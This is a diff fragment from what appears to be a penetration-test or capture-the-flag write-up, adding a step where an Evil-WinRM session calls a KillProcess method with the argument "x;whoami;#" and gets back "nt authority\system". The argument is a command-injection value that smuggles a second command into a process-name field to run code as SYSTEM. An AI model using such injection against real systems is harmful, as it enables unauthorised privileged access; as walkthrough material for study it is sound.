@@ -626,5 +626,12 @@ So for some reason this is not working over the tunnel i have on ligolo, so ill 
 
 First ill make a variable and set the uri to the correct endpoint
 
+```python
+*Evil-WinRM* PS C:\Software\Monitoring> $client.KillProcess("x;whoami;#")
+nt authority\system
+```
+
+Then simply calling the variable witth
+
 
 
